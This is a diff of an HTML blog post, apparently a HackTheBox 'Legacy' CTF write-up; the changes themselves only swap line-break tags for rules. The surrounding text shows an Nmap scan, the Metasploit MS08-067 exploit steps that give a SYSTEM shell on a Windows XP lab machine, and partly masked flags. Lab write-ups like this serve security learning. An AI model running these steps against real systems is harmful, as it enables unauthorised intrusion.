@@ -26,7 +26,7 @@
           <p style="float:left;"><a href="/posts/20191029_vulnhub-lazysysadmin1.html"> « </a>📅 published on <code>01/Nov/2019</code><a href="/posts/20191101_htb-lame.html"> » </a></p>
         <p style="float:right;">🔖 tagged <a href=/tags.html#hackthebox>hackthebox</a> and <a href=/tags.html#writeup>writeup</a></p>
     <div style="clear:both;"></div>
-    <br/><h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
+    <hr><h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
 <p class="nested">This is a writeup for HTB VM <a href="https://www.hackthebox.eu/home/machines/profile/2">Legacy</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
 <p class="nested"><img alt="writeup.overview.machinescli" src="/static/files/posts_htb_legacy/machinescli.png.webp" /></p>
 <h3 class="h3 collapsible" onclick="toggle(this);">Killchain</h3>
@@ -34,7 +34,7 @@
 <p class="nested"><img alt="writeup.overview.killchain" src="/static/files/posts_htb_legacy/killchain.png.webp" /></p>
 <h3 class="h3 collapsible" onclick="toggle(this);">TTPs</h3>
 <p class="nested">1. <code>139/tcp/netbios-ssn/Microsoft Windows netbios-ssn</code>: <a href="https://github.com/7h3rAm/writeups#exploit_smb_ms08_067">exploit_smb_ms08_067</a>  </p>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
 <p class="nested">1. Here's the Nmap scan result:  </p>
 <pre class="nested"><code># Nmap 7.70 scan initiated Fri Nov  1 14:44:27 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/htb.legacy/results/10.10.10.4/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/htb.legacy/results/10.10.10.4/scans/xml/_quick_tcp_nmap.xml 10.10.10.4
 Nmap scan report for 10.10.10.4
@@ -105,7 +105,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 139/tcp  |  netbios-ssn   |  Microsoft Windows netbios-ssn
 445/tcp  |  microsoft-ds  |  Windows XP microsoft-ds
 </code></pre>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
 <p class="nested">1. For a Microsoft Windows XP system with open SMB, we use the MSF <a href="https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2008/ms08-067">MS08-067</a> exploit <code>windows/smb/ms08_067_netapi</code> and gain a shell with elevated privileges on the target system:  </p>
 <pre class="nested"><code>msfconsole
   use exploit/windows/smb/ms08_067_netapi
@@ -125,7 +125,7 @@ type &quot;C:\Documents and Settings\Administrator\Desktop\root.txt&quot;
 <p class="nested"><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_htb_legacy/screenshot02.png.webp" />  </p>
 <p class="nested"><img alt="writeup.exploitation.steps.2.2" src="/static/files/posts_htb_legacy/screenshot03.png.webp" />  </p>
 <p class="nested"><img alt="writeup.exploitation.steps.2.3" src="/static/files/posts_htb_legacy/screenshot04.png.webp" />  </p>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
 <pre class="nested"><code>ntauth/system@LEGACY&gt; id
 NT AUTHORITY\SYSTEM
 ntauth/system@LEGACY&gt;  
@@ -148,12 +148,12 @@ ntauth/system@LEGACY&gt; users
 Administrator
 john
 </code></pre>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
 <h3 class="h3 collapsible" onclick="toggle(this);">Flags</h3>
 <pre class="nested"><code>C:\Documents and Settings\john\Desktop\user.txt: e69af0e4f443de7e................
 C:\Documents and Settings\Administrator\Desktop\root.txt: 993442d258b0e0..................
 </code></pre>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
 <ul class="nested">
 <li><a href="https://www.hackthebox.eu/home/machines/profile/2">https://www.hackthebox.eu/home/machines/profile/2</a>  </li>
 <li><a href="https://medium.com/@_C_3PJoe/htb-retired-box-walkthrough-legacy-147bbcc9ff02">https://medium.com/@_C_3PJoe/htb-retired-box-walkthrough-legacy-147bbcc9ff02</a>  </li>
